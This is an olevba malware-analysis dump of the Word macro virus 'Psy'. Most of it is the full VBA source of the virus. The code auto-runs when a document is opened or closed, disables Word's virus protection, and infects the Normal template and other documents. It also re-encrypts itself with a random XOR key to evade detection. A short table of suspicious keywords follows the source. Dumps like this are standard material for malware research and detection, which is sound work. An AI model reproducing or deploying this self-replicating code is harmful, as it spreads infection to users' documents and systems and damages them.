olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psy-00fd5471ea6bb70e1d453fca790ccd6c16530a1a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psy-00fd5471ea6bb70e1d453fca790ccd6c16530a1a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Psy-00fd5471ea6bb70e1d453fca790ccd6c16530a1a - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub autoopen(): psycode: End Sub
Private Sub document_open(): psycode: End Sub
Private Sub autoclose(): psycode: End Sub
Private Sub document_close(): psycode: End Sub
Private Sub psycode()
Application.ShowVisualBasicEditor = 0
If Len(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.lines(1, 5)) <> Len(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.lines(1, 5)) Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines: psycodeX
End Sub
Private Sub psycodeX()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
newcode
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString (.lines(.ProcStartLine("autoexec", 0), .CountOfLines - .ProcStartLine("autoexec", 0) + 1))
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString (.lines(1, 4))
End With
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
.replaceline .ProcStartLine("autoexec", 0), "private sub psycode"
For x = .CountOfLines - 8 To .CountOfLines
crap = ""
For y = 0 To 20 + Int(Rnd * 20)
crap = crap & Chr$(32 + Int(Rnd * 224))
Next y
.replaceline x, .lines(x, 1) & "'" & crap
Next x
End With
With ActiveDocument
.SaveAs .FullName
End With
End Sub
Private Sub newcode()
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
c = (128 + Int(Rnd * 128))
.replaceline .ProcStartLine("autoexec", 0) + 1, "c=" & c
.replaceline .ProcStartLine("autoexec", 0) + 2, "a1=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 3, "a2=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 4, "a3=" & Chr$(34) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 5, "a4=" & Chr$(34) & Chr$(34)
s = UCase$(.lines(1, (.CountOfLines)))
For k = 1 To Len(s)
t = Mid$(s, k, 1)
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr$(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next k
For x = 1 To Len(p): b = b & Chr$(Asc(Mid$(p, x, 1)) Xor c): Next x
.replaceline .ProcStartLine("autoexec", 0) + 2, "a1=" & Chr$(34) & Mid$(b, 1, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 3, "a2=" & Chr$(34) & Mid$(b, 1017, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 4, "a3=" & Chr$(34) & Mid$(b, 2033, 1016) & Chr$(34)
.replaceline .ProcStartLine("autoexec", 0) + 5, "a4=" & Chr$(34) & Mid$(b, 3049) & Chr$(34)
End With
End Sub
Private Sub autoquit()
newcode
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .ProcStartLine("autoexec", 0) - 1
End With
NormalTemplate.Save
End Sub
Private Sub toolsoptions()
Options.VirusProtection = 1
Dialogs(974).Show
Options.VirusProtection = 1
End Sub
Private Sub viewvbcode()
If Day(Now()) <> 28 Or Month(Now()) <> 51 Then GoTo bye
a = "psycode v?.?? may 28 1999"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Screen Saver.Marquee", "Text") = a
With Assistant
    .Visible = 1
    .Animation = 25
With Assistant.NewBalloon
    .Heading = a
    .Show
End With
    .Visible = 0
End With
bye: End Sub
Private Sub autoexec()
c = 0
a1 = ""
a2 = ""
a3 = ""
a4 = ""
a = a1 & a2 & a3 & a4
For x = 1 To Len(a)
    b = b & Chr$(Asc(Mid$(a, x, 1)) Xor c)
Next x
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines
.AddFromString b
End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

